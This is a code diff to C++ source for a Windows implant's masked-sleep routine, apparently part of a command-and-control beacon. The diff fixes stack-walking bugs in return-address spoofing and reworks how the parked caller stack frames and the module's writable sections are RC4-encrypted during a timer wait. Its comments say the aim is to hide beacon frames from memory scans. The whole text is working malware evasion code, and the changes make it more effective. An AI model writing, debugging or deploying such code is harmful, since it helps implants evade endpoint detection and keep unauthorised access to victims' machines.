@@ -83,9 +83,12 @@ inline bool spoof_stack(SpoofState& st) {
     st.count = 0;
     void** rbp = nullptr;
     const size_t STACK_HASH_SKIP = 4;   // skip our own sleepmask frames
-    // GCC AT&T inline asm: a bare `rbp` in the template is a SYMBOL reference
-    // ("undefined reference to rbp" at link time); the register needs %%rbp.
-    __asm__ volatile("mov %0, %%rbp" : "=r"(rbp));
+    // GCC AT&T inline asm: `mov src, dst` (destination LAST). To LOAD the
+    // frame pointer into the variable the source must be the register:
+    //   mov %%rbp, %0   ->  %0 := rbp        (correct)
+    // The reversed form `mov %0, %%rbp` would WRITE the (undefined) output
+    // register into RBP, clobbering the caller's frame pointer mid-function.
+    __asm__ volatile("mov %%rbp, %0" : "=r"(rbp));
 
     int skipped = 0;
     for (int i = 0; i < 64 && rbp; ++i) {
@@ -93,31 +96,40 @@ inline bool spoof_stack(SpoofState& st) {
         void* ret = *ret_slot;
         if (!ret) break;
 
-        // stop when we leave the thread's stack (bad walk / already spoofed)
-        // TEB via GS (x64). MinGW GCC on Windows needs the explicit branch-
-        // hint form; MSVC-style "gs:0x30" is rejected by the GNU assembler
-        // (junk `:0x30` after expression) so the PEB walk is used instead —
-        // always valid, no inline asm required.
+        // Validate the FRAME CHAIN, not the return address: `ret` is a code
+        // pointer and can never lie inside the [StackLimit, StackBase] data
+        // range, so testing it against the stack bounds (the old code)
+        // aborted the walk at the very first frame — spoofing never ran.
+        // The NT_TIB (TEB) lives at gs:0x30 on x64. NOTE: an earlier version
+        // walked PEB+0x10 for this, but that field is ImageBaseAddress, NOT
+        // the TEB — the walk/bounds then validated against DOS-header bytes.
         void* tibBase = nullptr;
 #if defined(__MINGW32__) || defined(__MINGW64__)
-        {
-            auto peb_ = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
-            if (peb_) tibBase = *reinterpret_cast<void**>(peb_ + 0x10); // PEB->Teb
-        }
+        tibBase = reinterpret_cast<void*>(__readgsqword(0x30));
 #else
-        __asm__ volatile("mov %0, %%gs:0x30" : "=r"(tibBase));
+        __asm__ volatile("mov %%gs:0x30, %0" : "=r"(tibBase));
 #endif
         auto tib = reinterpret_cast<NT_TIB*>(tibBase);
-        if (reinterpret_cast<uint8_t*>(ret) < reinterpret_cast<uint8_t*>(tib->StackLimit) ||
-            reinterpret_cast<uint8_t*>(ret) > reinterpret_cast<uint8_t*>(tib->StackBase))
-            break;
+        uint8_t* lo = reinterpret_cast<uint8_t*>(tib->StackLimit);
+        uint8_t* hi = reinterpret_cast<uint8_t*>(tib->StackBase);
+        uint8_t* cur = reinterpret_cast<uint8_t*>(rbp);
 
-        if (skipped < static_cast<int>(STACK_HASH_SKIP)) { skipped++; rbp = (void**)*rbp; continue; }
+        // the frame slot itself must sit inside the thread stack...
+        if (cur < lo || cur + 16 > hi) break;
+        // ...and a saved return address must point at code: if it looks like
+        // a stack address the walk drifted into non-frame data — stop.
+        if (reinterpret_cast<uint8_t*>(ret) >= lo && reinterpret_cast<uint8_t*>(ret) <= hi)
+            break;
+        // ancestors live at strictly higher addresses (stack grows down)
+        void** next = reinterpret_cast<void**>(*rbp);
+        if (reinterpret_cast<uint8_t*>(next) <= cur) break;
+
+        if (skipped < static_cast<int>(STACK_HASH_SKIP)) { skipped++; rbp = next; continue; }
 
         st.rets[st.count] = ret_slot;
         st.orig_ret[st.count] = ret;
         st.count++;
-        rbp = reinterpret_cast<void**>(*rbp);
+        rbp = next;
     }
     if (st.count < 2) { st.count = 0; return false; }  // not enough frames — don't half-spoof
 
@@ -138,31 +150,47 @@ inline void restore_stack(SpoofState& st) {
 // The thread's active stack pages are RW memory too: encrypting them while
 // parked hides beacon frames from scans AND keeps the saved return chain
 // unreadable. Restored after wake with the same RC4 stream (self-inverse).
-inline size_t stack_span(uint8_t** lo_out, uint8_t** hi_out) {
+//
+// Region = the parked CALLER frames, i.e. [boundary, StackBase):
+//  * lower bound = the caller's saved RBP (its frame base, read from OUR
+//    frame slot [our_rbp]); none of this frame's locals (key, RC4 contexts,
+//    spoof table — all consumed by the wake path BEFORE the decrypt) ever
+//    falls inside the range.
+//  * floored at our_rbp + 0x340: with the current ABI frame (rbp = rsp+0x80
+//    with a 0x358 allocation and a 0x40 register save area, entry rsp =
+//    rbp+0x318) the compiler may also use the 32-byte call-shadow area,
+//    whose top is exactly rbp+0x340.
+//  * the previous version encrypted StackLimit + span/2: on Windows the
+//    stack grows DOWN from StackBase, so the lower half of the reservation
+//    is normally UNCOMMITTED — the first crypt byte page-faults. The parked
+//    caller frames, by contrast, are committed by construction.
+// Returns 0 (leaves outputs alone) when the chain looks broken; the caller
+// then skips the stack crypt entirely.
+inline size_t stack_span(uint8_t** lo_out, uint8_t** hi_out,
+                         void* our_rbp, void* caller_rbp) {
     void* tebBase = nullptr;
 #if defined(__MINGW32__) || defined(__MINGW64__)
-    {
-        auto peb_ = reinterpret_cast<uint8_t*>(__readgsqword(0x60));
-        if (peb_) tebBase = *reinterpret_cast<void**>(peb_ + 0x10);
-    }
+    tebBase = reinterpret_cast<void*>(__readgsqword(0x30));   // TEB (NT_TIB)
 #else
-    __asm__ volatile("mov %0, %%gs:0x30" : "=r"(tebBase));
+    __asm__ volatile("mov %%gs:0x30, %0" : "=r"(tebBase));
 #endif
     auto tib = reinterpret_cast<NT_TIB*>(tebBase);
-    *lo_out = reinterpret_cast<uint8_t*>(tib->StackLimit);
-    *hi_out = reinterpret_cast<uint8_t*>(tib->StackBase);
-    size_t span = (size_t)(*hi_out - *lo_out);
-    // Only the dirty (in-use) portion matters: round the used part to pages.
-    MEMORY_BASIC_INFORMATION mbi;
-    if (VirtualQuery(*lo_out, &mbi, sizeof(mbi))) {
-        // conservative: encrypt the lower half of the committed stack region
-        // where the live frames actually are; full-span encryption of a
-        // 1 MB reserved stack would churn the pager for nothing.
-        size_t half = span / 2;
-        *hi_out = *lo_out + half;
-        return half;
-    }
-    return span;
+    uint8_t* lo = reinterpret_cast<uint8_t*>(tib->StackLimit);
+    uint8_t* hi = reinterpret_cast<uint8_t*>(tib->StackBase);
+
+    uintptr_t floor = (reinterpret_cast<uintptr_t>(our_rbp) + 0x340 + 0xF)
+                      & ~static_cast<uintptr_t>(0xF);
+    uint8_t* boundary = reinterpret_cast<uint8_t*>(caller_rbp);
+    if (reinterpret_cast<uintptr_t>(boundary) < floor)
+        boundary = reinterpret_cast<uint8_t*>(floor);
+    if (boundary <= lo || boundary >= hi) return 0;   // broken chain — skip
+    size_t len = static_cast<size_t>(hi - boundary);
+    // Sanity: no thread stack exceeds 8MB — anything bigger means the TIB was
+    // garbage; refuse to crypt (fail-safe skip) instead of running off the end.
+    if (len > 8u * 1024u * 1024u) return 0;
+    *lo_out = boundary;
+    *hi_out = hi;
+    return len;
 }
 
 }  // namespace sleepmask
@@ -170,7 +198,10 @@ inline size_t stack_span(uint8_t** lo_out, uint8_t** hi_out) {
 // ── The masked sleep entry point (replaces ekko_sleep in the main loop) ────
 namespace ekko {
 
-inline void ekko_sleep_masked(DWORD sleepMs) {
+// noinline: the stack-span logic below reads our own frame pointer and
+// assumes the RC4 contexts / key live in THIS frame (never in the encrypted
+// range). Inlining into the caller would invalidate that assumption.
+inline __attribute__((noinline)) void ekko_sleep_masked(DWORD sleepMs) {
     using namespace sleepmask;
 
     // 1. entropy for the RC4 key (same sources as ekko_sleep)
@@ -190,9 +221,12 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
             hModule = reinterpret_cast<HMODULE>(mbi.AllocationBase);
     }
 
-    // 3. stack-span to mask (in-use portion)
-    uint8_t *stkLo, *stkHi;
-    size_t stkLen = stack_span(&stkLo, &stkHi);
+    // 3. stack-span to mask: ONLY the parked caller frames (see stack_span():
+    //    the lower half of the reserved stack is uncommitted and would fault).
+    void* our_rbp = __builtin_frame_address(0);
+    void* caller_rbp = *reinterpret_cast<void**>(our_rbp);
+    uint8_t *stkLo = nullptr, *stkHi = nullptr;
+    size_t stkLen = stack_span(&stkLo, &stkHi, our_rbp, caller_rbp);
 
     // 4. SPOOF the return chain BEFORE anything is encrypted (the walk reads
     //    plaintext frames) and keep state on the heap.
@@ -207,10 +241,11 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
     Rc4Context rc4_stk;
     rc4_stk.init(key, sizeof(key));
 
-    // 5. MASK: RW sections of the module + the live stack pages.
+    // 5. MASK: RW sections of the module + the parked caller frames.
     if (hModule)
         encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
-    rc4_stk.crypt(stkLo, stkLen);
+    if (stkLen)
+        rc4_stk.crypt(stkLo, stkLen);
 
     // 6. WAIT on a high-resolution timer (scheduler-invisible sleep).
     auto pCreateTimer = (PFN_NtCreateWaitableTimer)
@@ -257,7 +292,8 @@ inline void ekko_sleep_masked(DWORD sleepMs) {
     rc4_stk.init(key, sizeof(key));
     if (hModule)
         encrypt_sections(reinterpret_cast<uint8_t*>(hModule), rc4_sec);
-    rc4_stk.crypt(stkLo, stkLen);
+    if (stkLen)
+        rc4_stk.crypt(stkLo, stkLen);
 
     // 8. restore the real return chain, wipe key material, free heap state.
     if (spoofed)
